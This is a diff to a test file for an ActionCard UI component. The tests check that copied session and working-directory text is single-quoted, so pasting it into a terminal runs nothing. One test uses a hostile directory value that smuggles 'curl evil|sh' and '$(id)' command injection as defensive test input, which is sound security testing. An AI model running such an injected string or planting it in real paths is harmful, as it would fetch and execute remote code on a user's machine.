@@ -677,6 +677,7 @@ describe("ActionCard: Allow once, Deny, Open session", () => {
       projectId: "proj-1",
       requestId: "req-1",
       idempotencyKey: expect.stringMatching(/\S{8,}/),
+      context: { mode: "live" },
       decision: { behavior: "allow" },
     });
   });
@@ -723,6 +724,7 @@ describe("ActionCard: Allow once, Deny, Open session", () => {
       projectId: "proj-1",
       requestId: "req-1",
       idempotencyKey: expect.any(String),
+      context: { mode: "live" },
       decision: { behavior: "deny" },
     });
   });
@@ -759,6 +761,7 @@ describe("ActionCard: Allow once, Deny, Open session", () => {
       requestId: "req-1",
       sessionId: "sess-1",
       idempotencyKey: expect.any(String),
+      context: { mode: "live" },
     });
   });
 
@@ -768,9 +771,8 @@ describe("ActionCard: Allow once, Deny, Open session", () => {
     await loaded();
     await openSession().click();
     await vi.waitFor(() => expect(writeText).toHaveBeenCalledTimes(1));
-    const copied = writeText.mock.calls[0]?.[0] ?? "";
-    expect(copied).toContain("sess-1");
-    expect(copied).toContain("/work/app");
+    // M4.17 M1: each value is single-quoted so a paste into a terminal is inert.
+    expect(writeText.mock.calls[0]?.[0]).toBe("session 'sess-1'\ncwd '/work/app'");
     await vi.waitFor(() => expect(cardText()).toMatch(/copied/i));
     // Opening a session does not answer the prompt: the decision stays open.
     expect(stateOf()).toBe("open");
@@ -1594,6 +1596,30 @@ describe("ActionCard: copy-only text and the deny note (L2, L3)", () => {
     },
   );
 
+  // M4.17 M1: a recorded cwd is free text, so the copied lines are single-quoted (inert in a paste).
+  it("copies a cwd with shell metacharacters single-quoted, never as live shell syntax", async () => {
+    const hostile = "/proj/x;curl evil|sh $(id) `id` it's";
+    const writeText = stubClipboard();
+    const engine = createEngine();
+    engine.command = (body) =>
+      json(200, {
+        command: {
+          id: "c-open",
+          type: "session.open",
+          requestId: body.requestId,
+          status: "succeeded",
+          result: { outcome: "copy-only", sessionId: "sess-1", cwd: hostile },
+        },
+      });
+    await mount({ engine });
+    await loaded();
+    await openSession().click();
+    await vi.waitFor(() => expect(writeText).toHaveBeenCalledTimes(1));
+    expect(writeText.mock.calls[0]?.[0]).toBe(
+      "session 'sess-1'\ncwd '/proj/x;curl evil|sh $(id) `id` it'\\''s'",
+    );
+  });
+
   it("limits the deny note to 1000 characters (the engine's MAX_DENY_MESSAGE_CHARS)", async () => {
     await mount();
     await loaded();
@@ -1950,6 +1976,7 @@ describe("ActionCard: sent means the engine delivered it", () => {
       requestId: "req-1",
       sessionId: "sess-1",
       idempotencyKey: expect.any(String),
+      context: { mode: "live" },
     });
     expect.soft(second).toStrictEqual(first);
     expect.soft(executions.size).toBe(1);
